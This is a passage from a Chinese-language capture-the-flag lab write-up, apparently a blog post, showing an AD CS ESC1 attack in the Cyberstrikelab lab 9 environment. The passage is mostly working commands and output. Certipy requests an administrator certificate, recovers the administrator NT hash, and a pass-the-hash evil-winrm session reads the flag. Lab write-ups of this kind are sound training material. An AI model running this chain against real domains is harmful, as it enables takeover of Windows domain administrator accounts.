Authorities\u003c/td\u003e\n\u003ctd\u003ecyberstrikelab-DC-CA\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCertificate Name Flag\u003c/td\u003e\n\u003ctd\u003eEnrolleeSuppliesSubject\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eClient Authentication\u003c/td\u003e\n\u003ctd\u003eTrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnabled\u003c/td\u003e\n\u003ctd\u003eTrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollee Supplies Subject\u003c/td\u003e\n\u003ctd\u003eTrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollment Agent\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollment Flag\u003c/td\u003e\n\u003ctd\u003eNone\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eExtended Key Usage\u003c/td\u003e\n\u003ctd\u003eClient Authentication\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMinimum RSA Key Length\u003c/td\u003e\n\u003ctd\u003e2,048\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePrivate Key Flag\u003c/td\u003e\n\u003ctd\u003e16842752\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRenewal Period\u003c/td\u003e\n\u003ctd\u003e6 weeks\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRequires Key Archival\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRequires Manager Approval\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eValidity Period\u003c/td\u003e\n\u003ctd\u003e1 year\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003edomain\u003c/td\u003e\n\u003ctd\u003eCYBERSTRIKELAB.COM\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003ccode\u003eCertificate Name Flag: EnrolleeSuppliesSubject\u003c/code\u003e 表明模板启用了 \u003ccode\u003eCT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u003c/code\u003e 标志。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eExtended Key Usage: Client Authentication\u003c/code\u003e 表示证书包含客户端身份验证的EKU（扩展密钥用法），使证书可用于Kerberos认证，进而获取TGT票据。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eRequires Manager Approval: False\u003c/code\u003e：无需管理员审批，允许直接颁发证书。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAuthorized Signatures Required: 0\u003c/code\u003e：无需额外签名授权，简化攻击流程\u003c/p\u003e\n\u003cp\u003eESC1 攻击利用：\u003ca href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san\"\u003ehttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san\u003c/a\u003e | \u003ca href=\"https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/\"\u003ehttps://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains -q certipy req \\\n  -u \u003cspan class=\"hljs-string\"\u003e'CYBERWEB$'\u003c/span\u003e \\\n  -hashes 331dcbb88d1a4847c97eab7c1c168ac8 \\\n  -dc-ip 10.6.6.55 \\\n  -target 10.6.6.55 \\\n  -ca \u003cspan class=\"hljs-string\"\u003e'CYBERSTRIKELAB-DC-CA'\u003c/span\u003e \\\n  -template \u003cspan class=\"hljs-string\"\u003e'DC'\u003c/span\u003e \\\n  -upn \u003cspan class=\"hljs-string\"\u003e'administrator@cyberstrikelab.com'\u003c/span\u003e \\\n  -dns-tcp \\\n  -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.6.6.55[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.6.6.55[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with UPN \u003cspan class=\"hljs-string\"\u003e'administrator@cyberstrikelab.com'\u003c/span\u003e\n[*] Certificate has no object SID\n[*] Saved certificate and private key to \u003cspan class=\"hljs-string\"\u003e'administrator.pfx'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains -q certipy auth -pfx administrator.pfx -dc-ip 10.6.6.55 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@cyberstrikelab.com\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to \u003cspan class=\"hljs-string\"\u003e'administrator.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator@cyberstrikelab.com'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:28cfbc91020438f2a064a63fff9871fa\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eflag 3\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Lab-9 proxychains evil-winrm -i 10.6.6.55 -u administrator -H 28cfbc91020438f2a064a63fff9871fa\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  172.16.233.2:8001  ...  10.6.6.55:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e flag.txt\ngo-flag{1DDE7826-F56B-486D-A661-E9AA83874EFA}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e总的来说不难，一把梭哈，但是环境问题太多了。\u003c/p\u003e","title":"Cyberstrikelab - lab9","date":"2025-05-22","updated":"2025-05-22","tags":["Cyberstrikelab","Windows靶机","域渗透","ADCS","ESC1","隧道搭建"],"categories":"靶机","comments":true,"description":"lab9 https://www.cyberstrikelab.com/#/target/kvm detail/269 靶标介绍：ATT\u0026CK实战框架 lab9 第一阶段：web 服务突破 核心动作：通过「特定凭证」登录后台管理系统 关键操作：利用工具 A 抓取通信数据，植入「特殊代码片段」 成果：..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Cyberstrikelablab9"},"buildId":"EF0DQAJMXN-imPciCFJTJ","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>